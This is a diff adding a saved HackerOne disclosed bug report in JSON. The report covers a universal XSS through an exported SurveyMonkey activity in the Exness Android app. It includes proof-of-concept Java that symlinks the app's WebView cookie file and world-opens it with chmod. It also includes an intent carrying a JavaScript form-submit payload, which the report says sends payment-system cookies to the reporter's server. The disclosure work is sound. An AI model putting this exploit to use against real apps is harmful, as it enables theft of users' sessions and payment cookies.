@@ -1,0 +1,239 @@
+{
+  "id": 532836,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MzI4MzY=",
+  "url": "https://hackerone.com/reports/532836",
+  "title": "[com.exness.android.pa Android] Universal XSS in webview. Lead to steal user cookies",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2019-04-09T20:11:31.259Z",
+  "submitted_at": "2019-04-09T20:11:31.259Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nearsecurity",
+    "url": "/nearsecurity",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 12719,
+    "url": "https://hackerone.com/exness",
+    "handle": "exness",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/nqcs1q40b15orz664sixj9ltiejh/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/nqcs1q40b15orz664sixj9ltiejh/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "EXNESS",
+      "twitter_handle": "",
+      "website": "https://www.exness.com",
+      "about": "We offer better-than-market conditions on currencies, crypto, stocks, indices, metals, and commodities."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-05-24T15:24:18.079Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2022-04-13T15:36:45.711Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Details:**\nPackage: com.exness.android.pa\nName: Exness\nVersion: 1.7.5-real-release\n\n\n**Description**: Third-app may use exported activity to load any url in internal webView. This leads to steal cookies used in trading app, including  cookies of payment system\n\n**Vulnerability description:**\nApplication has exported activity:\n```java\n        <activity android:name=\"com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity\" android:screenOrientation=\"locked\" android:windowSoftInputMode=\"adjustResize\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.MAIN\"/>\n            </intent-filter>\n        </activity>\n```\nThis activity get 2 extra string from intent:\n``` java\n       public void onCreate(Bundle bundle) {\n        super.onCreate(bundle);\n        Intent intent = getIntent();\n        this.aKn = intent.getStringExtra(\"smSPageHTML\");\n        this.aKq = intent.getStringExtra(\"smSPageURL\");\n        if (this.aKn == null) {\n            this.aKr = chn.m7508a(C3298a.ERROR_CODE_COLLECTOR_CLOSED, null);\n            Log.d(\"SM_SDK_DEBUG\", this.aKr.getDescription());\n            mo19074b(this.aKr); \n        } else if (bundle == null) {\n            getSupportFragmentManager().beginTransaction().add(16908290, chi.m12362c(this.aKq, this.aKn, true), chi.TAG).commit();\n        }\n    }\n```\nThen, the activity passes these strings to function chi.m12362c. This function create an intent of class chi (public class chi extends Fragment):\n```java\n    public static chi m12362c(String str, String str2, boolean z) {\n        chi chi = new chi();\n        Bundle bundle = new Bundle();\n        bundle.putString(\"smSPageURL\", str);\n        bundle.putString(\"smSPageHTML\", str2);\n        bundle.putBoolean(\"smHasLoadedSPageHTML\", z);\n        chi.setArguments(bundle);\n        return chi;\n    }\n```\nThen created intent will executed.\nFunction onCreate of class chi:\n```java\npublic void onCreate(Bundle bundle) {\n        super.onCreate(bundle);\n        this.aKo = false;\n        this.aKp = false;\n        this.aKn = null;\n        Bundle arguments = getArguments();\n        if (arguments != null) {\n            this.aKq = arguments.getString(\"smSPageURL\");\n            this.aKo = arguments.getBoolean(\"smHasLoadedSPageHTML\");\n            if (this.aKo) {\n                this.aKn = arguments.getString(\"smSPageHTML\");\n                m12353Gc(); // <-- pass to this function\n                return;\n            }\n            new C48221().execute(new String[]{this.aKq});\n        }\n    }\n\n```\n\nAfter pass checks, strings of intent used in function m12353Gc:\n```java\n    public void m12353Gc() {\n        if (getView() != null) {\n            this.aKv = ProgressDialog.show(getActivity(), null, getString(C3294c.sm_loading_status));\n            this.aKp = true;\n            this.mWebView = (WebView) getView().findViewById(C3292a.sm_feedback_webview);\n            this.mWebView.getSettings().setJavaScriptEnabled(true);\n            this.mWebView.setWebViewClient(new C3296b(this, null));\n            this.mWebView.loadDataWithBaseURL(this.aKq, this.aKn, null, \"UTF-8\", null);\n        }\n    }\n```\nIn this way we load any url with our html code.\n\n**Summary:**\nThird app create intent with extra:\nsmSPageHTML - loaded html\nsmSPageURL - url context of webview\nThen the Exness application will execute this html code on a background of activity where user need to enter his security code.\n\n**Steal cookies:**\nThis actions does not require root priv.\n\nThird app can create a symlink to cookie file. We use extention html because when it loads in webview, content of this file was interpreted as html:\n\n```java\ntry {\n            Runtime.getRuntime().exec(\"ln -s /data/data/com.exness.android.pa/app_webview/Cookies /data/data/pwn.pwn/pwn.html\").waitFor(); // create symlink to Cookie file\n            Runtime.getRuntime().exec(\"chmod 777 -R /data/data/pwn.pwn/\").waitFor(); //set access to everyone\n        } catch (Exception e) {\n            e.printStackTrace();\n            finish();\n            return;\n        }\n        new File(\"/data/data/pwn.pwn/pwn.html\").setReadable(true, false);\n```\n\nThen create an intent with malicious javascript, which setup an evil cookie.\nAfter load the symlink, script in cookie will be executed and all of file will be send to server\n\nPOC app:\n{F465510}\n\n**Screenshots:**\nUniversal XSS;\ncode of apk:\n```java\n                        Intent steal = new Intent();\n                        steal.setClassName(\"com.exness.android.pa\", \"com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity\");\n                        steal.putExtra(\"smSPageHTML\", \"<html><h1>Universal XSS</h1><script>var form = document.createElement(\\\"form\\\");\\n\" +\n                                \"    var element1 = document.createElement(\\\"input\\\");\\n\" +\n                                \"    form.method = \\\"POST\\\";\\n\" +\n                                \"    form.action = \\\"https://trade.mql5.com\\\";\\n\" +\n                                \"    element1.value=document.domain;;\\n\" +\n                                \"    element1.name=\\\"text\\\";\\n\" +\n                                \"    form.appendChild(element1);\\n\" +\n                                \"    document.body.appendChild(form);\\n\" +\n                                \"    form.submit();</script></html>\");\n                        steal.putExtra(\"smSPageURL\", \"https://trade.mql5.com/r/\");\n                        startActivity(steal);\n```\n{F465515}\n\nCookies:\n\"YOUR COOKIE:\" - header of my page where the files are sent and echoed\n{F465514}\n\nCookies of payanyway, qiwi, yandex money, moneta.ru, mql5:\n{F465516}\n{F465519}\n\n## Impact\n\nCan execute javascript in internal webview.\nCan steal user's cookies of payment system and mql5.",
+  "bounty_amount": "400.0",
+  "formatted_bounty": "$400",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 465510,
+      "file_name": "app-release.apk",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/465/510/9422dac52ef6b95b96c8afc603d33ac97f258e48/app-release.apk?response-content-disposition=attachment%3B%20filename%3D%22app-release.apk%22%3B%20filename%2A%3DUTF-8%27%27app-release.apk&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3LIMANAX%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T051214Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJIMEYCIQCnj8u5TOH%2BocHJ%2BlLjpJlZE%2BfARTx%2F0Uzt3YV6HyXFXAIhAIU%2FPdoGgtYUfu%2F67dNAXIqagWgeGQd%2FZpPw6uQQd46kKrIFCAYQAxoMMDEzNjE5Mjc0ODQ5IgyJLyuZhXWmhLcrHHcqjwWA8G2ZK55wMKrRK%2BqJ%2FS%2B7f34rWK%2B44pRqCps5EdHLvhLCoQE0uMytJXlGAPLtOvqY8qt6v6vzLwIGoI1MDS7SEHuyRl9QHt7RdqnRhKQ8u2MPQsGAlkES6sYII31D5T3If5WMg6pkFYw4L4RO5pdWi%2FUDIzguyRMUtwexs%2FavfIjSZWNq0AwD%2B3%2Bd%2BR1cA8v0p0rn8U3sdUER%2BwgLtTFwX1B1gq2bMc8e586AzZxY8B1NZiLUC0dfqOF3UKhQxbg51dgBalP1DoT6ALhsFYA75OFREpLjCjaF2gYQD8lwJ0JdTrZc8dKYAeQfJgb1s%2B%2B8xo5cPkTCWplAZ%2BK4m6SGVmCuxljhPF4PrZ96xa3aqiq1b5MkuBaHpby3QeuhE0gSEvVyewfG6ZZ4apQt9yguLZ3jJq77Z2HXG2rGZXuTwrr0tHfApsE17%2BmC0Bpmw%2FoTAXRjvKV08PeZGVqLNMpTsuyKH8cwoy4cMW3ax1uFfe%2BonzpOMRe%2FCO3nY8t9ApvX%2FUsFo3q20VERDg1kYXdqdLdYEI4t5pD%2FRWySH6rXjrlX8xpF6SbUoVeBJEqgMPn7X2pU0L66Le4lBGDu6g%2BhJKtDthxLnFO0veTt6Ug9w17RPIP8H6OKr9JiExIUHnmQ7WyTDfCRg%2FtvJhxuwZ9zE3j4QhtZfMao3uGobSgOOwOe7C%2FAJ3CvYiHqXOzrsdcgeKBPYEp7ZT6y8F8mG6ssQOOlol5wkl4k8AENNjRILF4wnXw612LSTjef9FwCNxEPq4IEz2B%2BbPjw2tNsVaNBsora39nUFxuCUd%2BH8l8iy3RMpAFp%2BLGejEfE4ndEVvhhuq%2BSIGlNIZXNRRz5ge4AC9U6TZSytVG0ttimcnujMOWBndIGOrABc9acHCHcFpZnpqnIOM1pPrxV%2FWgXoXodUqC0s6%2BxWBxkiD48yICazCA3ET0IoNBkc9bhKetLaRT6BjGq7l1cQ3NrgNJ8%2BgPetN0RsJtInfHc0sb6OyaSXFBfhhkqwkL6VUkJYYEaO2uTaKwch3F15FSKTcuEFzGK7kKNh7XK00DxGgj30%2F1KsDHFrLCDcnty2leBvv4Yd2T9QIwphqwY3V6qAUwROCGXJk5vmlF4m30%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2ed00425e522b5d84a2bc2152f806e31018639e2bbe47212eff8e75eb4c9c55d",
+      "file_size": 1447564,
+      "type": "application/zip",
+      "moderated": null
+    },
+    {
+      "id": 465514,
+      "file_name": "Screenshot_20190409-220841.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/465/514/816cba40054fa2da00b4d38ef8330735ef8d2999/Screenshot_20190409-220841.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_20190409-220841.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_20190409-220841.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3LIMANAX%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T051214Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJIMEYCIQCnj8u5TOH%2BocHJ%2BlLjpJlZE%2BfARTx%2F0Uzt3YV6HyXFXAIhAIU%2FPdoGgtYUfu%2F67dNAXIqagWgeGQd%2FZpPw6uQQd46kKrIFCAYQAxoMMDEzNjE5Mjc0ODQ5IgyJLyuZhXWmhLcrHHcqjwWA8G2ZK55wMKrRK%2BqJ%2FS%2B7f34rWK%2B44pRqCps5EdHLvhLCoQE0uMytJXlGAPLtOvqY8qt6v6vzLwIGoI1MDS7SEHuyRl9QHt7RdqnRhKQ8u2MPQsGAlkES6sYII31D5T3If5WMg6pkFYw4L4RO5pdWi%2FUDIzguyRMUtwexs%2FavfIjSZWNq0AwD%2B3%2Bd%2BR1cA8v0p0rn8U3sdUER%2BwgLtTFwX1B1gq2bMc8e586AzZxY8B1NZiLUC0dfqOF3UKhQxbg51dgBalP1DoT6ALhsFYA75OFREpLjCjaF2gYQD8lwJ0JdTrZc8dKYAeQfJgb1s%2B%2B8xo5cPkTCWplAZ%2BK4m6SGVmCuxljhPF4PrZ96xa3aqiq1b5MkuBaHpby3QeuhE0gSEvVyewfG6ZZ4apQt9yguLZ3jJq77Z2HXG2rGZXuTwrr0tHfApsE17%2BmC0Bpmw%2FoTAXRjvKV08PeZGVqLNMpTsuyKH8cwoy4cMW3ax1uFfe%2BonzpOMRe%2FCO3nY8t9ApvX%2FUsFo3q20VERDg1kYXdqdLdYEI4t5pD%2FRWySH6rXjrlX8xpF6SbUoVeBJEqgMPn7X2pU0L66Le4lBGDu6g%2BhJKtDthxLnFO0veTt6Ug9w17RPIP8H6OKr9JiExIUHnmQ7WyTDfCRg%2FtvJhxuwZ9zE3j4QhtZfMao3uGobSgOOwOe7C%2FAJ3CvYiHqXOzrsdcgeKBPYEp7ZT6y8F8mG6ssQOOlol5wkl4k8AENNjRILF4wnXw612LSTjef9FwCNxEPq4IEz2B%2BbPjw2tNsVaNBsora39nUFxuCUd%2BH8l8iy3RMpAFp%2BLGejEfE4ndEVvhhuq%2BSIGlNIZXNRRz5ge4AC9U6TZSytVG0ttimcnujMOWBndIGOrABc9acHCHcFpZnpqnIOM1pPrxV%2FWgXoXodUqC0s6%2BxWBxkiD48yICazCA3ET0IoNBkc9bhKetLaRT6BjGq7l1cQ3NrgNJ8%2BgPetN0RsJtInfHc0sb6OyaSXFBfhhkqwkL6VUkJYYEaO2uTaKwch3F15FSKTcuEFzGK7kKNh7XK00DxGgj30%2F1KsDHFrLCDcnty2leBvv4Yd2T9QIwphqwY3V6qAUwROCGXJk5vmlF4m30%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=efab01b49330335c8778dc45d845f7e0d23e5e472d292d2b1859c9953aad5bdb",
+      "file_size": 400597,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 465515,
+      "file_name": "Screenshot_20190409-221332.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/465/515/3cf64e9d1096b61a2ed9d56feac9bb9219385201/Screenshot_20190409-221332.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_20190409-221332.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_20190409-221332.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3LIMANAX%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T051214Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJIMEYCIQCnj8u5TOH%2BocHJ%2BlLjpJlZE%2BfARTx%2F0Uzt3YV6HyXFXAIhAIU%2FPdoGgtYUfu%2F67dNAXIqagWgeGQd%2FZpPw6uQQd46kKrIFCAYQAxoMMDEzNjE5Mjc0ODQ5IgyJLyuZhXWmhLcrHHcqjwWA8G2ZK55wMKrRK%2BqJ%2FS%2B7f34rWK%2B44pRqCps5EdHLvhLCoQE0uMytJXlGAPLtOvqY8qt6v6vzLwIGoI1MDS7SEHuyRl9QHt7RdqnRhKQ8u2MPQsGAlkES6sYII31D5T3If5WMg6pkFYw4L4RO5pdWi%2FUDIzguyRMUtwexs%2FavfIjSZWNq0AwD%2B3%2Bd%2BR1cA8v0p0rn8U3sdUER%2BwgLtTFwX1B1gq2bMc8e586AzZxY8B1NZiLUC0dfqOF3UKhQxbg51dgBalP1DoT6ALhsFYA75OFREpLjCjaF2gYQD8lwJ0JdTrZc8dKYAeQfJgb1s%2B%2B8xo5cPkTCWplAZ%2BK4m6SGVmCuxljhPF4PrZ96xa3aqiq1b5MkuBaHpby3QeuhE0gSEvVyewfG6ZZ4apQt9yguLZ3jJq77Z2HXG2rGZXuTwrr0tHfApsE17%2BmC0Bpmw%2FoTAXRjvKV08PeZGVqLNMpTsuyKH8cwoy4cMW3ax1uFfe%2BonzpOMRe%2FCO3nY8t9ApvX%2FUsFo3q20VERDg1kYXdqdLdYEI4t5pD%2FRWySH6rXjrlX8xpF6SbUoVeBJEqgMPn7X2pU0L66Le4lBGDu6g%2BhJKtDthxLnFO0veTt6Ug9w17RPIP8H6OKr9JiExIUHnmQ7WyTDfCRg%2FtvJhxuwZ9zE3j4QhtZfMao3uGobSgOOwOe7C%2FAJ3CvYiHqXOzrsdcgeKBPYEp7ZT6y8F8mG6ssQOOlol5wkl4k8AENNjRILF4wnXw612LSTjef9FwCNxEPq4IEz2B%2BbPjw2tNsVaNBsora39nUFxuCUd%2BH8l8iy3RMpAFp%2BLGejEfE4ndEVvhhuq%2BSIGlNIZXNRRz5ge4AC9U6TZSytVG0ttimcnujMOWBndIGOrABc9acHCHcFpZnpqnIOM1pPrxV%2FWgXoXodUqC0s6%2BxWBxkiD48yICazCA3ET0IoNBkc9bhKetLaRT6BjGq7l1cQ3NrgNJ8%2BgPetN0RsJtInfHc0sb6OyaSXFBfhhkqwkL6VUkJYYEaO2uTaKwch3F15FSKTcuEFzGK7kKNh7XK00DxGgj30%2F1KsDHFrLCDcnty2leBvv4Yd2T9QIwphqwY3V6qAUwROCGXJk5vmlF4m30%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a3eb89e2583feec12f34e91995fc82345c0a0d4ea0b5700b8422f47f0207e0b9",
+      "file_size": 59383,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 465516,
+      "file_name": "Screenshot_20190409-224030.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/465/516/5c00b4fd94e4a5538c8850136513c89882ff94fb/Screenshot_20190409-224030.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_20190409-224030.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_20190409-224030.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3LIMANAX%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T051214Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJIMEYCIQCnj8u5TOH%2BocHJ%2BlLjpJlZE%2BfARTx%2F0Uzt3YV6HyXFXAIhAIU%2FPdoGgtYUfu%2F67dNAXIqagWgeGQd%2FZpPw6uQQd46kKrIFCAYQAxoMMDEzNjE5Mjc0ODQ5IgyJLyuZhXWmhLcrHHcqjwWA8G2ZK55wMKrRK%2BqJ%2FS%2B7f34rWK%2B44pRqCps5EdHLvhLCoQE0uMytJXlGAPLtOvqY8qt6v6vzLwIGoI1MDS7SEHuyRl9QHt7RdqnRhKQ8u2MPQsGAlkES6sYII31D5T3If5WMg6pkFYw4L4RO5pdWi%2FUDIzguyRMUtwexs%2FavfIjSZWNq0AwD%2B3%2Bd%2BR1cA8v0p0rn8U3sdUER%2BwgLtTFwX1B1gq2bMc8e586AzZxY8B1NZiLUC0dfqOF3UKhQxbg51dgBalP1DoT6ALhsFYA75OFREpLjCjaF2gYQD8lwJ0JdTrZc8dKYAeQfJgb1s%2B%2B8xo5cPkTCWplAZ%2BK4m6SGVmCuxljhPF4PrZ96xa3aqiq1b5MkuBaHpby3QeuhE0gSEvVyewfG6ZZ4apQt9yguLZ3jJq77Z2HXG2rGZXuTwrr0tHfApsE17%2BmC0Bpmw%2FoTAXRjvKV08PeZGVqLNMpTsuyKH8cwoy4cMW3ax1uFfe%2BonzpOMRe%2FCO3nY8t9ApvX%2FUsFo3q20VERDg1kYXdqdLdYEI4t5pD%2FRWySH6rXjrlX8xpF6SbUoVeBJEqgMPn7X2pU0L66Le4lBGDu6g%2BhJKtDthxLnFO0veTt6Ug9w17RPIP8H6OKr9JiExIUHnmQ7WyTDfCRg%2FtvJhxuwZ9zE3j4QhtZfMao3uGobSgOOwOe7C%2FAJ3CvYiHqXOzrsdcgeKBPYEp7ZT6y8F8mG6ssQOOlol5wkl4k8AENNjRILF4wnXw612LSTjef9FwCNxEPq4IEz2B%2BbPjw2tNsVaNBsora39nUFxuCUd%2BH8l8iy3RMpAFp%2BLGejEfE4ndEVvhhuq%2BSIGlNIZXNRRz5ge4AC9U6TZSytVG0ttimcnujMOWBndIGOrABc9acHCHcFpZnpqnIOM1pPrxV%2FWgXoXodUqC0s6%2BxWBxkiD48yICazCA3ET0IoNBkc9bhKetLaRT6BjGq7l1cQ3NrgNJ8%2BgPetN0RsJtInfHc0sb6OyaSXFBfhhkqwkL6VUkJYYEaO2uTaKwch3F15FSKTcuEFzGK7kKNh7XK00DxGgj30%2F1KsDHFrLCDcnty2leBvv4Yd2T9QIwphqwY3V6qAUwROCGXJk5vmlF4m30%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b30712f98c42bba8c0237e941cc5e6fde71c1ffc7ac7cbb941a035de84f71794",
+      "file_size": 394966,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 465519,
+      "file_name": "Screenshot_20190409-224316.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/465/519/9f414b05833ee096fd5aea3ff867644a6c4bb87b/Screenshot_20190409-224316.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_20190409-224316.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_20190409-224316.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3LIMANAX%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T051214Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJIMEYCIQCnj8u5TOH%2BocHJ%2BlLjpJlZE%2BfARTx%2F0Uzt3YV6HyXFXAIhAIU%2FPdoGgtYUfu%2F67dNAXIqagWgeGQd%2FZpPw6uQQd46kKrIFCAYQAxoMMDEzNjE5Mjc0ODQ5IgyJLyuZhXWmhLcrHHcqjwWA8G2ZK55wMKrRK%2BqJ%2FS%2B7f34rWK%2B44pRqCps5EdHLvhLCoQE0uMytJXlGAPLtOvqY8qt6v6vzLwIGoI1MDS7SEHuyRl9QHt7RdqnRhKQ8u2MPQsGAlkES6sYII31D5T3If5WMg6pkFYw4L4RO5pdWi%2FUDIzguyRMUtwexs%2FavfIjSZWNq0AwD%2B3%2Bd%2BR1cA8v0p0rn8U3sdUER%2BwgLtTFwX1B1gq2bMc8e586AzZxY8B1NZiLUC0dfqOF3UKhQxbg51dgBalP1DoT6ALhsFYA75OFREpLjCjaF2gYQD8lwJ0JdTrZc8dKYAeQfJgb1s%2B%2B8xo5cPkTCWplAZ%2BK4m6SGVmCuxljhPF4PrZ96xa3aqiq1b5MkuBaHpby3QeuhE0gSEvVyewfG6ZZ4apQt9yguLZ3jJq77Z2HXG2rGZXuTwrr0tHfApsE17%2BmC0Bpmw%2FoTAXRjvKV08PeZGVqLNMpTsuyKH8cwoy4cMW3ax1uFfe%2BonzpOMRe%2FCO3nY8t9ApvX%2FUsFo3q20VERDg1kYXdqdLdYEI4t5pD%2FRWySH6rXjrlX8xpF6SbUoVeBJEqgMPn7X2pU0L66Le4lBGDu6g%2BhJKtDthxLnFO0veTt6Ug9w17RPIP8H6OKr9JiExIUHnmQ7WyTDfCRg%2FtvJhxuwZ9zE3j4QhtZfMao3uGobSgOOwOe7C%2FAJ3CvYiHqXOzrsdcgeKBPYEp7ZT6y8F8mG6ssQOOlol5wkl4k8AENNjRILF4wnXw612LSTjef9FwCNxEPq4IEz2B%2BbPjw2tNsVaNBsora39nUFxuCUd%2BH8l8iy3RMpAFp%2BLGejEfE4ndEVvhhuq%2BSIGlNIZXNRRz5ge4AC9U6TZSytVG0ttimcnujMOWBndIGOrABc9acHCHcFpZnpqnIOM1pPrxV%2FWgXoXodUqC0s6%2BxWBxkiD48yICazCA3ET0IoNBkc9bhKetLaRT6BjGq7l1cQ3NrgNJ8%2BgPetN0RsJtInfHc0sb6OyaSXFBfhhkqwkL6VUkJYYEaO2uTaKwch3F15FSKTcuEFzGK7kKNh7XK00DxGgj30%2F1KsDHFrLCDcnty2leBvv4Yd2T9QIwphqwY3V6qAUwROCGXJk5vmlF4m30%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d070ae2d13194619c9512eaf44a145ab02530c6cbd8c77eb9e4d7ece03c12607",
+      "file_size": 436202,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 26,
+  "voters": [
+    "wickedwick",
+    "cxzer0",
+    "fr4via",
+    "alp",
+    "zy9ard3",
+    "mohaned0101",
+    "neutron11",
+    "nomad0",
+    "pacmanx",
+    "f_m",
+    "and 16 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 22552,
+    "asset_type": "OTHER_APK",
+    "asset_identifier": "com.exness.android.pa",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "532836",
+  "votes": 26,
+  "latest_disclosable_activity_at": "2022-05-24T15:24:17.935Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T13:12:14.355350",
+    "source": "https://hackerone.com/reports/532836.json",
+    "report_id": 532836
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MzI4MzY=",
+    "databaseId": "532836",
+    "title": "[com.exness.android.pa Android] Universal XSS in webview. Lead to steal user cookies",
+    "url": "https://hackerone.com/reports/532836",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2022-05-24T15:24:18.079Z",
+    "created_at": "2019-04-09T20:11:31.259Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzI2",
+      "name": "Improper Access Control - Generic",
+      "external_id": "cwe-284"
+    },
+    "severity": {
+      "rating": "low",
+      "score": null
+    },
+    "reporter": {
+      "username": "nearsecurity"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEyNzE5",
+      "handle": "exness",
+      "name": "EXNESS",
+      "url": "https://hackerone.com/exness",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8yNDU0OTE=",
+            "amount": "400.00",
+            "awarded_amount": "400.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2020-09-16T07:37:16.563Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzUzMjgzNg==",
+    "_id": "532836",
+    "disclosed": true,
+    "votes": 26,
+    "latest_disclosable_activity_at": "2022-05-24T15:24:17.935Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MzI4MzY=",
+      "databaseId": "532836",
+      "title": "[com.exness.android.pa Android] Universal XSS in webview. Lead to steal user cookies",
+      "url": "https://hackerone.com/reports/532836",
+      "disclosed_at": "2022-05-24T15:24:18.079Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEyNzE5",
+      "handle": "exness",
+      "name": "EXNESS",
+      "url": "https://hackerone.com/exness",
+      "currency": "usd"
+    }
+  }
+}
